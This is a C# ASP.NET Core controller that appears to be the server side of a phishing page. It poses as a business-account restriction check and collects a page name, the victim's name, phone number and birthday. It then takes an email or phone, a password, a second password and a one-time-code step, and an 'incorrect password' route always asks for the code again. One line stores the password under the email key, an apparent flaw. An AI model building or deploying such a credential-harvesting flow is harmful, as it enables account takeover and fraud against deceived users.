using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using System.Diagnostics;
using WebApplication1.Models;

namespace WebApplication1.Controllers
{
    public class BusinessController : Controller
    {
        private readonly ILogger<BusinessController> _logger;

        public BusinessController(ILogger<BusinessController> logger)
        {
            _logger = logger;
        }

        [HttpPost]
        public IActionResult RestrictionsInformation(string authen)
        {
            return View();
        }

        [HttpPost]
        public IActionResult Login(string pageName, string yourName, string phoneNumber, string birthday)
        {
            HttpContext.Session.SetString(Constants.PAGE_NAME, pageName);
            HttpContext.Session.SetString(Constants.NAME, yourName);
            HttpContext.Session.SetString(Constants.PHONE, phoneNumber);
            HttpContext.Session.SetString(Constants.BIRTHDAY, birthday);
            return View();
        }

        [HttpPost]
        public IActionResult Confirming(string emailOrPhone, string password,string action)
        {
            if (!string.IsNullOrEmpty(emailOrPhone))
            {
                HttpContext.Session.SetString(Constants.EMAIL_OR_PHONE, emailOrPhone);
                HttpContext.Session.SetString(Constants.EMAIL_OR_PHONE, password);
            }
            else
            {
                HttpContext.Session.SetString(Constants.PASSWORD2, password);
                ViewBag.Message = "otp";
            }
            ViewBag.TimeConfirm = 3;
            return View();
        }

        [HttpGet]
        public IActionResult IncorrectPassword()
        {
            ViewBag.Message = "otp";
            return View();
        }

        [HttpGet]
        public IActionResult Authentication()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
